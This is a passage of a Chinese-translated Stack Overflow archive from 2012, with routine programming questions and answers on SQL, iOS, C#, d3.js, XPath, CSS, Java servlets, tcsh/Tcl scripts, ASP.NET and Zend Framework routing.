                                              AND (C.acc_obj || C.acc_sub) <= (A.acc_obj || A.acc_sub)
                                              AND C.acc_level_of_detail < A.acc_level_of_detail
                                          )
           AND rownum < 2
       ) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T07:57:10.500

当我面临像这样的长期工作更新时，我将其重写为 MERGE 语句。因此，如果查询本身运行速度很快，只需重写以合并，否则考虑重写查询。

我希望你在 (b.acc_obj || b.acc_sub) 上有一个 FBI（基于函数的索引）——它可以稍微提高性能。

# iphone - 如何在不使用服务器的情况下为 iPhone 创建 P2P 聊天应用程序？

> ID：12068491
> 
> 赞同：-2
> 
> 时间：2012-08-22T07:46:26.190
> 
> 标签：iphone, objective-c, xcode, ios5, chat

谁能告诉我，是否可以在不使用服务器的情况下创建 iPhone 聊天应用程序。我只需要两个连接。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T07:49:00.443

我想这可能是因为两个设备必须直接连接（即蓝牙、wifi 等）。因此，它们可能会发现彼此（在应用程序层，即在给定端口上定期广播 UDP 数据包？），创建 tcp 连接（或 UDP，但在这种情况下，您应该确保在应用程序级别实际接收到所有发送的消息......）在其之上可以实现实际的聊天协议

# c# - 在 onStart() 方法中停止 Windows 服务

> ID：12068492
> 
> 赞同：6
> 
> 时间：2012-08-22T07:46:28.523
> 
> 标签：c#, windows-services

`onStart()`当客户没有许可证时，我想停止 Windows 服务。我使用`service.Stop()`，但它不起作用。

```
protected override void OnStart(string[] args)
{
    try
    {
        _bridgeServiceEventLog.WriteEntry("new OnStart");
        if (LicenseValidetor.ValidCountAndTypeDevices())
        {
            WsInitializeBridge();
        }
        else
        {
            service = new ServiceController("BridgeService");
            service.Stop();
            _bridgeServiceEventLog.WriteEntry("LicenseValidetor Error");
        }
        _bridgeServiceEventLog.WriteEntry("end Start");
    }
    catch (Exception e)
    {
        _bridgeServiceEventLog.WriteEntry("error In onstart method ");
    }

} 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-22T08:05:01.743

您不能从`OnStart`同一服务的方法中停止服务。

该[`ServiceController.Stop`](http://msdn.microsoft.com/en-us/library/system.serviceprocess.servicecontroller.stop.aspx)方法在内部调用[`ControlService`](http://msdn.microsoft.com/en-us/library/windows/desktop/ms682108%28v=vs.85%29.aspx)（或它的`Ex`对应物）。请注意，此功能可能失败的原因之一是：

> **ERROR_SERVICE_CANNOT_ACCEPT_CTRL** 请求的控制代码无法发送到服务，因为服务的状态为**SERVICE_STOPPED**、**SERVICE_START_PENDING**或**SERVICE_STOP_PENDING**。

好吧，你猜怎么着——当你在你的`OnStart`方法中时，你的服务状态是`SERVICE_START_PENDING`.

* * *

处理这种情况的正确方法是向任何其他线程发出信号，表明您可能已经开始让它们退出，然后退出您的`OnStart`方法。服务控制管理器会注意到该进程已退出并将您的服务状态恢复为`SERVICE_STOPPED`. 它还可以通知交互式用户“服务已启动然后停止”或类似的词语。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T08:33:07.303

我注意到您没有等待确保服务实际上已停止，或者它是否甚至在第一个实例中运行。

做这个 ：-

```
protected override void OnStart(string[] args)
{
    try
    {
        _bridgeServiceEventLog.WriteEntry("new OnStart");
        if (LicenseValidetor.ValidCountAndTypeDevices())
        {
            WsInitializeBridge();
        }
        else
        {
            int time = 10000;

            TimeSpan timeout = TimeSpan.FromMilliseconds(time);

            service.Stop();
            service.WaitForStatus(ServiceControllerStatus.Stopped, timeout);

            _bridgeServiceEventLog.WriteEntry("LicenseValidetor Error");
        }
        _bridgeServiceEventLog.WriteEntry("end Start");
    }
    catch (Exception e)
    {
        _bridgeServiceEventLog.WriteEntry("error In onstart method ");
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-12-02T17:33:06.393

我想补充一点，“根本不启动任何工人”可能行不通（或者我可能只是很愚蠢；））。

我建立了一个服务，在我的 OnStart 代码周围有一个 try/catch(all) 。由于我的 .config 文件中缺少一行，它在启动任何工作线程之前因 IOException 而崩溃。异常跳过了我的线程启动器。我的代码没有启动任何线程。诚实地。

但服务没有停止。我不知道为什么。作为一个绝望的措施，我重新抛出了例外，这有帮助。

我仍然想知道企业库配置中的文件系统观察程序线程是否是问题所在。EntLib 已深入到我的代码中以将其作为实验删除，因此我没有进一步调查。

# ios5 - 将我的触摸区域限制为 UIImageVIew 的一部分

> ID：12068502
> 
> 赞同：0
> 
> 时间：2012-08-22T07:47:10.393
> 
> 标签：ios5, uiimageview, uigesturerecognizer

我有一个 UIViewController，我在其中添加了一个带有 CGRectMake(0,0,1024,704) 的 UIImageView。(768-导航栏 ht-状态栏 ht=704)。我只在横向模式下工作。我向这个 UIImageView 添加了点击手势。但我想将此点击区域的高度限制为 604。这张图片应该让它有点清楚。红线区域是 UIImageView，绿线和红线区域是不需要触摸事件的区域。 ![在此处输入图像描述](../Images/181cd5804858d8f83c21f11f752cbc00.png)

知道如何去做吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T08:03:26.237

您可以使用 in 的[`locationInView:`](http://developer.apple.com/library/ios/documentation/UIKit/Reference/UIGestureRecognizer_Class/Reference/Reference.html#//apple_ref/occ/instm/UIGestureRecognizer/locationInView%3a)方法`UITabGestureRecognizer`来了解用户点击的位置，并做出相应的响应。

# java - 为什么 CookieStore 的默认实现不使用树状结构？

> ID：12068505
> 
> 赞同：0
> 
> 时间：2012-08-22T07:47:12.657
> 
> 标签：java, performance, cookies, cookiestore

InMemoryCookieStore 是 java 的默认 CookieStore，但主存储是一个 ArrayList，最坏的情况下添加和删除操作将花费 O(n)，并且索引是 map，它会扫描 keySet 以删除过期的 cookie。为什么它使用树（可以很好地表示域，例如 .b.com 是 .abcom 的父级）和设置（在恒定时间内定位 Cookie）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T07:51:55.463

CookieStore 有一个方法

```
List<HttpCookie> getCookies() 
```

因此它必须按需维护或复制所有 cookie。我认为他们认为维护列表是最有效的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T08:02:42.680

就性能而言，您多久拥有如此多的 cookie，以至于 O(n) 明显大于 O(1)？在子优化和代码可管理性之间进行选择时，大多数人会选择干净、可管理的代码。

# javascript - 计算质心 d3

> ID：12068510
> 
> 赞同：2
> 
> 时间：2012-08-22T07:47:25.183
> 
> 标签：javascript, svg, d3.js

根据[维基百科的 svg 世界地图，](http://en.wikipedia.org/wiki/File%3aWorld_map_-_low_resolution.svg)我需要计算每个国家的质心。d3 库支持[路径的质心方法](https://github.com/mbostock/d3/wiki/Geo-Paths#wiki-centroid)。在提供的 svg 文件中，包含每个国家/地区的路径坐标。例如德国：

我如何使用 svg 数据的属性“d”来计算 D3 语法中的质心？我需要它指向每个国家的质心。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2016-04-27T22:14:05.150

您应该考虑使用 Mike Bostock 库中的世界地图文件，因为 d3 示例将为这些投影和文件做好准备。一些世界地图在这里，例如： [https ://github.com/mbostock/topojson](https://github.com/mbostock/topojson)

我认为这真的会简化你的生活，你可以使用 topojson 编写这样的代码：

```
var svg = d3.select('#yourmap').append('svg');

var g = svg.append('g')
    .style(//some styling, like stroke-width);

var projection = //your projection
    .scale(//your scale)
    .translate(//your width/2, height/2)
var path = d3.geo.path()
    .projection(projection

//read in your json file...

var world = topojson.feature(world.objects.countries).features //guessing at a potential structure of your file

g.selectAll('circle')
        .data(world)
      .enter().append('circle')
        .attr('transform', function(d) { return 'translate(' + path.centroid(d) + ')'; })
        .attr('r', //whatever you want your radius to be, in pixels); 
```

除非您使用 Wikipedia SVG 有特殊原因？

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-22T14:46:40.277

您可以根据这个[示例](http://jsfiddle.net/kxzJ5/2/)计算质心，取自[这个问题](https://stackoverflow.com/questions/4814675/find-center-point-of-a-polygon-in-js)。可能有一种更简单的方法，但是将它与 d3.js 一起使用可能是这样的：

```
function area(pts) {
    var area=0;
    var nPts = pts.length;
    var j=nPts-1;
    var p1; var p2;

    for (var i=0;i<nPts;j=i++) {
        p1=pts[i]; p2=pts[j];
        area+=p1.x*p2.y;
        area-=p1.y*p2.x;
    }
    area/=2;
    return area;
};

function computeCentroid(pts) {
    var nPts = pts.length;
    var x=0; var y=0;
    var f;
    var j=nPts-1;
    var p1; var p2;

    for (var i=0;i<nPts;j=i++) {
        p1=pts[i]; p2=pts[j];
        f=p1.x*p2.y-p2.x*p1.y;
        x+=(p1.x+p2.x)*f;
        y+=(p1.y+p2.y)*f;
    }

    f=area(pts)*6;
    return [x/f,y/f];
};

var path = d3.geo.path().projection(projection);

var map = chartSvg.selectAll('path.feature')
    .data(mapFiltered);
map.enter().append('path')
    .attr('class', 'feature');
map.attr('d', function(d, i){
    var pathString = path(d,i);
    var pathStringTrimmed = pathString.substring(1, pathString.length-1);
    var pathArray = pathStringTrimmed.split('L').map(function(d, i){var xy = d.split(','); return {x: ~~xy[0], y: ~~xy[1]};});
    console.log(computeCentroid(pathArray));
    return path(d,i);}) 
```

编辑：

此示例从具有规范化路径的 GeoJSON 文件开始。在您的 SVG 中，您必须自己规范化路径，因为未填充[normalizedPathSegList属性。](http://www.w3.org/TR/SVG/paths.html#__svg__SVGAnimatedPathData__normalizedPathSegList)例如，您可以使用 Inkscape 将其保存为 pdf 并将其重新导入到 SVG 文件中。[这](http://phrogz.net/convert-svg-path-to-all-absolute-commands)是一种使用 javascript 将所有相对路径转换为绝对路径的方法。

顺便说一句，解析原始 d 字符串的另一种方法是使用 SVGPathSegList.getItem() 查询每个元素的 SVGPathSegList。

但是要真正使用 d3 为您加载、投影和查找质心，如果您从默认的 GeoJSON 世界地图或您找到或制作的另一张地图开始，会容易得多。

# xslt - xsl - 按子节点选择

> ID：12068517
> 
> 赞同：1
> 
> 时间：2012-08-22T07:47:59.847
> 
> 标签：xslt, select

我只选择包含特定子节点的 xml 元素时遇到问题。假设 xml 的以下部分：

```
<root>
<Navision.Buchungen>
    <Saldo>-110867.7500</Saldo>
    <Navision.Kontostruktur>
        <Bereich>1</Bereich>
    </Navision.Kontostruktur>
</Navision.Buchungen>
<Navision.Buchungen>
    <Saldo>-3082585.2100</Saldo>
    <Navision.Kontostruktur>
        <Bereich>2</Bereich>
    </Navision.Kontostruktur>
</Navision.Buchungen>
...
</root> 
```

现在我有一个这样的 xsl 部分来获得“Saldo”的总和：

```
<xsl:variable name="FACT0" select="sum(//root/Navision.Buchungen/Saldo)"/> 
```

但是，例如，我怎样才能只为“Bereich”1 选择 Saldo？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T07:50:36.290

使用这个 XPath：

```
//root/Navision.Buchungen[Navision.Kontostruktur/Bereich = 1]/Saldo 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-22T07:52:01.933

```
//root/Navision.Buchungen[Navision.Kontostruktur/Bereich = 1]/Saldo 
```

**编辑：** 哦已经发布了。

对于进一步的问题，您可以使用像[这样的在线测试平台之一](http://www.whitebeam.org/library/guide/TechNotes/xpathtestbed.rhtm)。当然还有像[w3schools 这样的好手册，还有 xsl 的测试平台](http://www.w3schools.com/xpath/xpath_syntax.asp)

# responsive-design - 困惑：通过纯 HTML/CSS 特殊调整大小的响应式标题？

> ID：12068522
> 
> 赞同：2
> 
> 时间：2012-08-22T07:48:22.577
> 
> 标签：responsive-design, fluid-layout, css

我们有一个使用 JavaScript 的解决方案，但我也很好奇是否有办法使用纯 CSS 来做到这一点？

# 情况

我对响应式设计相对较新，过去一直坚持使用定位等来实现我的布局。我正在尝试创建一个以特定方式调整大小的简单响应式标头。

# 我的困境

页眉是页面顶部的一个 29 像素高的栏，两端都有 29x29 的按钮。在中间，与右侧按钮相邻的是一个 div（用于页面标题），我希望它的最小宽度为 300，但我也希望它随着浏览器宽度而扩展。

*这里有一个问题：*我希望这个标题 div 从左按钮上拉开，留下*最大宽度*为 200 像素的间隙。一旦达到间隙的最大宽度，我希望标题 div 开始扩展，保持按下右键。见下文。

![IMG](../Images/af217ebbbdb355fdb86c652fece65e71.png)

*注意：我在[这里](http://jsfiddle.net/vRr3Z/)创建了一个 jsfiddle进行实验*

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T10:33:08.177

好的，这就是我到目前为止所拥有的。早上会编辑（有点累）

我觉得这绝对是可能的，但它确实需要 javascript。您希望有一个 200px 可用空间这一事实需要 javascript 或某种编程来告诉样式执行此操作。

```
 <!DOCTYPE html>
<html>
    <style>
        html, body { height: 100%; }
        #container { margin-top: 29px; }
        header { height:29px; margin: 0 49px; background-color:#999999; }

        #div1 { width: 29px; height: 100%; background-color: yellow; display: inline-block; }
        #div2 { width: 100%; height: 100%; background-color: blue; display: inline-block; }
        #div3 { width: 29px; height: 100%; background-color: red; display: inline-block; float: right;}
        #div4 { height: 100%; background-color: yellow; display: inline-block;  float: right; }
    </style>
<body>
    <div id="container">
        <header>
            <div id="div1">div1</div><div id="div2">div2</div><div id="div3">div3</div><div id="div4">div4</div>
        </header>
    </div>
</body>
    <script>
        if (parseInt(document.getElementById("div2").clientWidth) >= 200) {
            document.getElementById("div2").style.width = "200px";
        }
    </script>
</html> 
```

So the way I went about it is rather than having 3 divs, I made 4 -- the original 3 you had, but then the white space you want to consider as, well open space, I made a div for that as well. I also have javascript so that when the window scales past a width of 200px, it will lock it at that width. Unfortunately, I'm not super polished with my CSS yet so I'm still trying to figure a way to get that working. If anyone wants to edit my answer, please feel free.

需要指出的另一件事是，虽然 javascript 确实适用于导航正在增长，但它不适用于缩小。如果说用户决定缩小他的窗口大小，我没有实现一种能够缩小它的方法，因为我将它设置为将宽度锁定在 200 像素（我想解决这个问题的方法是使用`} else { clientWidth = "100%"`? 不当然。希望这能让你走上正确的轨道。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T14:03:15.323

我已经[修改了您的 JSFiddle](http://jsfiddle.net/vRr3Z/2/)并添加了一些 JavaScript 以获得我认为您正在寻找的效果。还有一些注释可以引导您准确了解 JS 代码试图完成的工作。

本质上，我将处理程序绑定到 window.resize 事件，计算标题中的可用空间，并从标题容器中添加或减去以保持其宽度。

# sql - 多部分标识符无法绑定（加入子查询）

> ID：12068527
> 
> 赞同：2
> 
> 时间：2012-08-22T07:48:29.300
> 
> 标签：sql, tsql, join

可能重复，但对这种情况没有提供任何见解： [无法绑定多部分标识符](https://stackoverflow.com/questions/7314134/the-multi-part-identifier-could-not-be-bound)

我有以下形式的查询：

```
select l.id, l.foo, r.id, r.foo
from tbl l 
    inner join storyevents r on l.id = r.id
    right join (
        select distinct foo from tbl where id= l.id
    ) tmp on l.foo = tmp.foo
where l.foo = 12345 
```

但我收到以下错误：

```
The multi-part identifier "l.id" could not be bound. 
```

关于`right join`子查询。

加分项：这是尝试从`inner join`基于单个列中删除重复行。更好的方法来做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T07:50:33.547

试试这个，

```
SELECT l.id, l.foo, r.id, r.foo
FROM   storyevents l 
         INNER JOIN storyevents r 
               ON l.id = r.id
         RIGHT JOIN 
         (
               SELECT distinct extid, foo 
               FROM storyevents
         ) tmp on l.foo = tmp.foo AND
                  tmp.extid = l.id
where l.foo = 12345 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T07:50:50.720

删除重复行的更好方法？

```
 select distinct l.id, l.foo, r.id, r.foo 
 .... 
```

# c++-cli - 在 C++/CLI 中列出 WIA 设备失败，并显示“无法从 'int' 转换为 'System::Object ^%'”

> ID：12068528
> 
> 赞同：0
> 
> 时间：2012-08-22T07:48:31.940
> 
> 标签：c++-cli, wia

我正在尝试使用 C++/CLI 列出所有 WIA 设备。我对 C++/CLI 相当陌生（尽管我认为自己是一名中级 C++ 程序员），但我不断收到此错误：

```
error C2664: 'WIA::IDeviceInfos::default::get' : cannot convert parameter 1 from 'int' to 'System::Object ^%' 
```

使用以下代码片段时：

```
DeviceManager^ dm = (gcnew WIA::DeviceManager());
for (int i = 1; i <= dm->DeviceInfos->Count; i++)
{
String^ deviceName = dm->DeviceInfos[i].Properties("Name")->get_Value()->ToString();
this->devices->Items->Add(deviceName);
} 
```

为什么我应该将该**int**视为**Object**？在托管 C++ 中有拳击的概念，但它在这里不起作用，无论如何我认为引入 C++/CLI 是为了摆脱它？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T07:56:05.307

Value 属性需要一些不明显的代码才能将其取出。试试这个：

```
WIA::DeviceInfo ^ info = dm->DeviceInfos[gcnew System::Int32(i)];
WIA::Property ^ propName = info->Properties[gcnew System::String(L"Name")];
String ^ strName = propName->default->ToString(); 
```

# java - 无法编译 .java 代码，未进行任何更改

> ID：12068535
> 
> 赞同：0
> 
> 时间：2012-08-22T07:49:15.120
> 
> 标签：java, ant, compilation

我已经从这里[http://www.roseindia.net/jboss/sessionbeanservlet.shtml](http://www.roseindia.net/jboss/sessionbeanservlet.shtml)下载了示例会话 bean servlet ，下载在“下载本课代码”下。标签。文件是使用 ant 编译的，下载后就可以工作。我编译了 ant 脚本并构建成功，但是当我使用 .java 代码从其中一个文件中删除一个字母并将其写回并保存时，我收到的错误很少。

输出： http: [//pastebin.com/H0JYUckX](http://pastebin.com/H0JYUckX)

有任何想法吗？

//我获取了 src 文件，并制作了 netbeans 项目，它可以工作。所以我不用再担心这个问题了。问候。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T07:54:57.677

我假设您已经下载了代码的源代码和编译版本。

这可能意味着代码没有重新编译，因为您已经有一个编译版本。但是，当您修改文件时，您会发现您的程序永远不会构建，这很可能是因为您的环境未设置为构建此文件。即有这个源需要的库，而你的构建中没有这些库。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-22T07:52:21.270

包含`servlet.jar`在您的类路径中。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-22T07:52:09.753

servlet API 不是标准 Java API 的一部分。您必须将包含 servlet API 的 JAR 文件添加到类路径才能编译使用此 API 的代码。

例如，如果您使用的是[Apache Tomcat](http://tomcat.apache.org)`servlet-api.jar` ，您可以在`lib`Tomcat 安装目录中找到 JAR 文件。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-23T15:35:01.927

I went back to this issue and solution is adding servlet-api.jar and jboss-j2ee.jar to ant/lib folder. In console I could see information that build is successful, but really this files weren't compiled. It just assumed that .class files are in package so it doesn't need to compile it again. Message was "BUILD SUCCESSFUL" but it hasn't been compiled at all. So when I deleted them real compilation started and I needed to provide this .jar files.

Greets.

# ios - 在哪里存储在 iOS 上购买的大于 200MB 的超大文件？

> ID：12068536
> 
> 赞同：0
> 
> 时间：2012-08-22T07:49:28.240
> 
> 标签：ios, in-app-purchase, download, storage, nsfilemanager

我必须在哪里存储下载的 iOS 上的大文件？
该文件超过200MB。**< Application_Home >/Library/Caches**
是它的正确目录吗？

 **该文件是在应用程序内购买后下载的，并且应该保留在应用程序中。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T07:58:33.650

iCloud 在 Apple 实现后，Document 目录数据与 iCloud Storage 有某种关联。因此，Apple 现在拒绝在文档目录中使用大量数据存储的应用程序。

您需要将数据存储在其他位置。将 PDF 和其他图稿文件存储在其他位置。

此链接可能对您有所帮助。

[https://developer.apple.com/icloud/documentation/data-storage/](https://developer.apple.com/icloud/documentation/data-storage/)

我希望这有帮助。**

# svg - mobi文件中span标签内的svg图像不显示数字

> ID：12068541
> 
> 赞同：0
> 
> 时间：2012-08-22T07:49:49.567
> 
> 标签：svg, kindle-fire

当将svg图像放在span标签内时

```
<span>
<svg:svg xmlns="http://www.w3.org/1998/Math/MathML" xmlns:svg="http://www.w3.org/2000/svg" xmlns:svgmath="http://www.grigoriev.ru/svgmath" height="15.405117pt" width="14.613340pt" viewBox="0 -11.686934 14.613340 15.405117"><svg:metadata><svgmath:metrics top="15.4051171875" axis="7.70255859375" baseline="3.71818359375" bottom="0.0" /></svg:metadata><svg:g transform="translate(0.000000, -3.984375)"><svg:g transform="translate(5.066426, -1.599609)"><svg:text font-size="8.520000" text-anchor="middle" y="0.000000" x="2.240244" font-family="Times New Roman" fill="black">1</svg:text></svg:g><svg:g transform="translate(0.585938, 7.702559)"><svg:text font-size="8.520000" text-anchor="middle" y="0.000000" x="6.720732" font-family="Times New Roman" fill="black">100</svg:text></svg:g><svg:line stroke-width="0.585938" x1="0.000000" x2="14.613340" stroke="black" stroke-linecap="butt" stroke-dasharray="none" y1="0.000000" y2="0.000000" fill="none" /></svg:g></svg:svg>
</span> 
```

并生成kindle mobi文件，分数数字不会出现，但是当使用div时，它会正确显示。如何在跨度内显示正确的 svg？？？？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-16T07:15:49.237

我通过将 svg 放在引用 svg 文件的对象标记中找到了一种解决方法

# unix - tcl/tcsh 混合脚本上的错误放置 () 错误

> ID：12068543
> 
> 赞同：2
> 
> 时间：2012-08-22T07:49:53.107
> 
> 标签：unix, tcl, tcsh

我有一个休闲脚本，它在开始时在 tcsh 中运行，然后在 tcl 中运行。我得到了错误`badly placed ()'s`，不明白为什么我得到它。

```
 #!/usr/intel/bin/tcsh -f
    #\
    set TCL_VERSION="8.4.6o_64"
    #\
    setenv WORK_AREA_ROOT_DIR .
    #\
    exec ${CAD_ROOT}/tcl/${TCL_VERSION}/bin/wishx "$0" "$*" &

    lappend auto_path $env(KITE)/lib/pwidget
    lappend auto_path $env(KITE)/local_cad/nlview/tcl/
    lappend auto_path $env(KITE)/tcl/

    lappend auto_path $env(KITE)/gui/tcl/plotter
    lappend auto_path $env(KITE)/gui/tcl/graph-class

    package require Pwidget+
    package require Nlview

    package require sparam_view_graph

    package require BLT
    namespace import -force ::blt::bgexec

    source $env(KITE)/gui/tcl/sparam_view_env.tcl
    source $env(KITE)/tcl/sparamParser.tcl

    load $env(KITE)/lib/utils/libKitKiteUtilsTcl.so
    source $env(KITE)/lib/utils/qbnamex.tcl

    catch {delete object reg}
    TclRegistry reg -varname _app

    sparam_view_env "." $argv 
```

只有在我得到 tcl (wish) 开始运行的指示后才会出现错误消息：

```
> bin/sparam_view_stand_alone.tcl /nfs/iil/proj/dt/epm16/work/imelam2/test/kite_check/kite/input/s2p/ISI_bit29.s2p
[1] 11474
Badly placed ()'s. 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-22T11:51:07.623

> ```
> exec ${CAD_ROOT}/tcl/${TCL_VERSION}/bin/wishx "$0" "$*" & 
> ```

以 a`&`结尾，这会在脚本上执行 TCL 解释器，但会继续在 csh 中执行。由于后面是 TCL 语法而不是 csh，因此这不能正确结束，并且确实 csh 在到达 line 时会抱怨`lappend auto_path $env(KITE)/lib/pwidget`。删除`&`.

此外，`"$*"`连接所有参数并将它们作为单个参数传递给`wishx`. 要不变地传递参数，请将`${*:q}`. 此外，如果`wishx`解释器由于某种原因不存在，您应该退出脚本而不是继续在 tcsh 中执行它。

```
exec "${CAD_ROOT}/tcl/${TCL_VERSION}/bin/wishx" "$0" ${*:q}
#\
exit 127 
```

* * *

哦，考虑改用 Bourne shell 语法。[Csh 本来就不是一个很好的脚本工具](http://www.faqs.org/faqs/unix-faq/shell/csh-whynot/)，甚至在交互式使用方面，tcsh 从 1990 年代初就被 zsh 超越，而 bash 在 1990 年代后期赶上了。现在你会发现很多没有 csh 的 unix 系统，而每个 unix 系统都有一个 Bourne 风格的 shell as `/bin/sh`，你很难找到一个太旧以至于它不[理解`"$@"`](http://www.in-ulm.de/~mascheck/various/bourne_args/)的 .

```
#!/bin/sh
#\
TCL_VERSION="8.4.6o_64"
#\
WORK_AREA_ROOT_DIR=.
#\
export WORK_AREA_ROOT_DIR
#\
exec "${CAD_ROOT}/tcl/${TCL_VERSION}/bin/wishx" "$0" "$@"
#\
exit 
```

# c# - ASP.NET 中继器控件中的图像复选框

> ID：12068545
> 
> 赞同：0
> 
> 时间：2012-08-22T07:50:02.233
> 
> 标签：c#, asp.net, repeater

我正在使用 ASP.NET。我正在使用中继器来显示图像，并且我还为每个图像使用了一个复选框。

如何选择单个图像并根据图像 ID 更新它们的值？

我的代码是：

```
 protected void Button3_Click(object sender, EventArgs e)
        {
            foreach (RepeaterItem ritem in Repeater1.Items)
            {
                CheckBox btn = ritem.FindControl("CheckBox1") as CheckBox;
                if (btn.Checked == true)
                {
                    string chrck = btn.Text;
                }
            }
        } 
```

这是我使用的控件：

```
 <asp:Repeater ID="Repeater1" runat="server">
         <ItemTemplate>
               <br />
               <img ID="ImageZoom" runat="server" 
                    src='<%# DataBinder.Eval(Container.DataItem, "ImageUrl") %>'  
                    style="display: inline; height:auto; left: 0pt; top: 0pt; 
                    width:auto;" />
                <asp:CheckBox ID="CheckBox1" runat="server" Enabled="True" 
                      Text='<%# DataBinder.Eval(Container.DataItem, "ImageId") %>' 
                      oncheckedchanged="RepeaterCheckBox_CheckedChanged"/> 
          </ItemTemplate>
    </asp:Repeater>
    <br />
    <br />
    <asp:Button ID="Button1" runat="server" onclick="Button3_Click" Text="Pint" /> 
```

但是在 c# 代码中，我总是得到**IsChecked value = false**。即使我检查了 Checkbox 并且当我点击*pint*按钮时，我也只会得到 false 。我该如何解决这个问题？如果我选中复选框，它应该返回 true。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T07:51:18.507

尝试使用`ItemDataBound`FindControl

```
void Repetarer_ItemDataBound(Object Sender, RepeaterItemEventArgs e) 
{
          if (e.Item.ItemType == ListItemType.Item || e.Item.ItemType == ListItemType.AlternatingItem) 
          {
               var control = e.Item.FindControl("CheckBox1") as CheckBox;      
               string result = control.Text;
               ..... 
          }
       } 
```

# jquery - ASP.NET - 以编程方式显示/隐藏 jquery .ready 代码

> ID：12068546
> 
> 赞同：0
> 
> 时间：2012-08-22T07:50:06.507
> 
> 标签：jquery, .net, tablednd

我有aspnet表单，jquery函数是加载的：

```
<script type="text/javascript">
    $(document).ready(function () {
        var table = document.getElementById('<%=grdNews.ClientID%>');
        var tableDnD = new TableDnD();
        tableDnD.init(table);
    })
</script> 
```

*仅供参考：这不是我的代码，我还没有开发 TableDnD 类。此 clss 为 aspnet 形式的一个表附加了拖放功能。*

这里一切正常。

但是，现在我有了一个新的要求：对于一些用户**我不需要**做这个 jquery，对于一些 - 这个 jquery**仍然是必要**的。我怎样才能以编程方式实现这一目标？这将是这样的：

```
ON PAGE LOAD:
if (User == SpecificUser) 
{
     ALLOW_ABOVE_JQUERY (LOAD JQUERY FUNCTION ON LOAD) //?HOW
}
else 
{
     DO_NOT_ALLOW_ABOVE_JQUERY (DISABLE LOADING JQUERY FUNCTION ON LOAD) //?HOW
} 
```

这是关于背后代码中的 javascript 的东西，但这是 $(document).ready 让我感到困惑。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-22T07:55:19.983

您可以在标记中使用服务器标签：

```
<% if (User == SpecificUser) { %>
<script type="text/javascript">
  $(document).ready(function () {
    var table = document.getElementById('<%=grdNews.ClientID%>');
    var tableDnD = new TableDnD();
    tableDnD.init(table);
  });
</script>
<% } %> 
```

或者，您可以将其放在占位符中：

```
<asp:PlaceHolder ID="ScriptContainer" runat="server">
<script type="text/javascript">
  $(document).ready(function () {
    var table = document.getElementById('<%=grdNews.ClientID%>');
    var tableDnD = new TableDnD();
    tableDnD.init(table);
  });
</script>
</asp:PlaceHolder> 
```

然后隐藏代码后面的内容：

```
if (User != SpecificUser) {
  ScriptContainer.Visible = false;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T08:03:12.127

您可以拥有一个 javascript 变量`shouldDnD`并添加必要的代码以在服务器上设置其值，并稍后使用该变量来决定是否打开 DnD。例如：

```
<script type="text/javascript">
var shouldDnD = <%= User == SpecificUser %>
if (shouldDnD) {
    $(document).ready(function () {
        var table = document.getElementById('<%=grdNews.ClientID%>');
        var tableDnD = new TableDnD();
        tableDnD.init(table);
    })
}
</script> 
```

您也可以在函数内部进行 shouldDnD 检查，具体取决于代码的其余部分。

# php - Zend Framework 2：Router\Exception“部分路由可能不会终止”

> ID：12068551
> 
> 赞同：1
> 
> 时间：2012-08-22T07:50:40.347
> 
> 标签：php, router, zend-framework2

尝试通过调用组装路线时

```
return $this->redirect()->toRoute('application'); 
```

在我的控制器中，我得到以下异常：

```
Zend\Mvc\Router\Exception\RuntimeException
File: library\Zend\Mvc\Router\Http\Part.php:181
Message: Part route may not terminate 
```

路由配置如下：

```
 'routes' => array(
        'application' => array(
            'type' => 'Segment',
            'options' => array(
                'route' => '/[:controller[/[:action[/]]]]',
                'constraints' => array(
                    'controller' => '[a-zA-Z][a-zA-Z0-9_-]*',
                    'action' => '[a-zA-Z][a-zA-Z0-9_-]*',
                ),
                'defaults' => array(
                    '__NAMESPACE__' => 'Application\Controller',
                    'controller' => 'Index',
                    'action' => 'index',
                ),
            ),
            'child_routes' => array(
                'wildcard' => array(
                    'type' => 'Wildcard',
                ),
            ), 
        ),
    ), 
```

是否需要将`controller/action`路线作为路线的子路线`/`？当我像这样配置它时，它可以工作。当我使用路由`[/[:controller[/[:action[/]]]]]`（带有可选的前导斜杠）时，它适用于某些程序集，但不适用于所有程序集，它们都以上述相同的方式调用，部分来自其他模块。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-22T07:54:20.497

该错误已经告诉您问题所在：您`may_terminate`在当前路线中缺少一个选项。因此，您不能通过`short-circuit`返回`redirect()`插件返回值来实现。

只需添加一个

```
'may_terminate' => true 
```

到您的路线配置（可能到所有路线配置）。

# sql - 将特殊字符 XML 插入 SQL

> ID：12068552
> 
> 赞同：0
> 
> 时间：2012-08-22T07:50:40.423
> 
> 标签：sql, xml, character

* * *

